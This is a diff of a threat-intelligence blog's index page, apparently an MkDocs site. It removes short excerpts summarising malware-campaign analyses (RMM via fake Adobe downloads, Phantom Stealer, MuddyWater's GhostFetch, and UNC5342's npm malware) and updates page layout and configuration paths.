-    <h2 id="malicious-distribution-of-rmm-tools-via-adobe-themed-download-infrastructure"><a class="toclink" href="rmm-via-adobe-themed-download/">Malicious Distribution of RMM Tools via Adobe-Themed Download Infrastructure</a></h2>
-<p>In March and April 2026, I observed a some spearphishing samples that were most likely a part of a phishing campaign targeting financial departments in Europe and across multiple sectors. The campaign directed victims to previously compromised websites hosting fake Adobe software that deployed Remote Monitoring and Management (RMM) tools to establish access to victim systems. In one observed case, the phishing email, purporting to be a document pending to be signed, was delivered to the victim mailbox, passing email security filters (Exhibit 1).</p>
-
-    
-      <nav class="md-post__action">
-        <a href="rmm-via-adobe-themed-download/">
-          Continue reading
-        </a>
-      </nav>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-      <nav class="md-post__authors md-typeset">
-        
-          <span class="md-author">
-            <img src="https://github.com/V0lundr.png" alt="V0lundr">
-          </span>
-        
-      </nav>
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-03-15 00:00:00+00:00">2026-03-15</time></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              10 min read
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="from-invoice-lure-to-in-memory-injection-phantom-stealer-via-donut-and-heavens-gate"><a class="toclink" href="invoice-lure-phantom-stealer-donut-heavens-gate/">From Invoice Lure to In-Memory Injection: Phantom Stealer via Donut and Heaven's Gate</a></h2>
-<h3 id="from-invoice-lure-to-in-memory-injection"><a class="toclink" href="invoice-lure-phantom-stealer-donut-heavens-gate/#from-invoice-lure-to-in-memory-injection">From Invoice Lure to In-Memory Injection</a></h3>
-<p>In January 2026, I identified a phishing campaign leveraging compromised supplier
-mailboxes and a multi-stage infection chain to deploy Phantom Stealer using obfuscated
-batch loaders, in-memory PowerShell decryption, Donut shellcode injection, and
-Heaven's Gate evasion. This post analyses the campaign's tradecraft, persistence
-mechanisms, and data exfiltration methods.</p>
-
-    
-      <nav class="md-post__action">
-        <a href="invoice-lure-phantom-stealer-donut-heavens-gate/">
-          Continue reading
-        </a>
-      </nav>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-      <nav class="md-post__authors md-typeset">
-        
-          <span class="md-author">
-            <img src="https://github.com/V0lundr.png" alt="V0lundr">
-          </span>
-        
-      </nav>
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-02-17 00:00:00+00:00">2026-02-17</time></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              10 min read
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="muddywater-weaponizes-word-macros-in-targeted-campaign-delivering-ghostfetch"><a class="toclink" href="muddywater-word-macros-ghostfetch/">MuddyWater Weaponizes Word Macros in Targeted Campaign Delivering GhostFetch</a></h2>
-<h3 id="muddywater-weaponises-word-macros-in-targeted-campaign-delivering-ghostfetch"><a class="toclink" href="muddywater-word-macros-ghostfetch/#muddywater-weaponises-word-macros-in-targeted-campaign-delivering-ghostfetch">MuddyWater Weaponises Word Macros in Targeted Campaign Delivering GhostFetch</a></h3>
-<p>In February 2026, I identified a new phishing campaign associated with MuddyWater,
-framed as a travel reservation from Air Arabia. When recipients enable the document's
-embedded macro, it installs and executes the GhostFetch loader. This post analyses
-the campaign's lure design, delivery mechanism, and GhostFetch behaviour, and
-provides practical guidance for defenders.</p>
-
-    
-      <nav class="md-post__action">
-        <a href="muddywater-word-macros-ghostfetch/">
-          Continue reading
-        </a>
-      </nav>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-      <nav class="md-post__authors md-typeset">
-        
-          <span class="md-author">
-            <img src="https://github.com/V0lundr.png" alt="V0lundr">
-          </span>
-        
-      </nav>
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-01-08 00:00:00+00:00">2026-01-08</time></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              8 min read
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure"><a class="toclink" href="unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure/">UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure</a></h2>
-<h3 id="unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure_1"><a class="toclink" href="unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure/#unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure_1">UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure</a></h3>
-<p>While continuing to track DPRK-linked weaponised npm packages, I observed UNC5342
-refining its delivery chain — pivoting away from Vercel infrastructure and adopting
-<code>jsonsilo[.]com</code> and <code>npoint[.]io</code> as payload staging points for the OtterCookie
-malware family.</p>
-
-    
-      <nav class="md-post__action">
-        <a href="unc5342-refines-ottercookie-delivery-chain-with-jsonsilo-infrastructure/">
-          Continue reading
-        </a>
-      </nav>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-      <nav class="md-post__authors md-typeset">
-        
-          <span class="md-author">
-            <img src="https://github.com/V0lundr.png" alt="V0lundr">
-          </span>
-        
-      </nav>
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2025-12-12 00:00:00+00:00">2025-12-12</time></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              6 min read
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payload"><a class="toclink" href="unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payload/">UNC5342 NPM Malware Uses Custom Headers to Gate Malicious Payload</a></h2>
-<h3 id="unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payloads"><a class="toclink" href="unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payload/#unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payloads">UNC5342 NPM Malware Uses Custom Headers to Gate Malicious Payloads</a></h3>
-<p>While tracking DPRK-linked weaponised npm packages, I came across an unreported
-technique employed by UNC5342 to evade detection and analysis. The malicious package
-uses a conditional serving mechanism that delivers different responses based on request
-authentication — effectively hiding the malicious payload while remaining operational
-against targets.</p>
-
-    
-      <nav class="md-post__action">
-        <a href="unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payload/">
-          Continue reading
-        </a>
-      </nav>
-    
-    
-  </div>
-</article>
-      
-      
-        
-          
 
 
 
-<nav class="md-pagination">
+
+
+
+
   
-</nav>
-        
+  
+
+
+
+
+  
+
+
+
       
-    </div>
+    </article>
   </div>
 
           
@@ -2104,12 +2181,12 @@ against targets.</p>
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.tabs", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
-        <script src="../javascripts/fix.js"></script>
+        <script src="../../javascripts/fix.js"></script>
       
     
   </body>
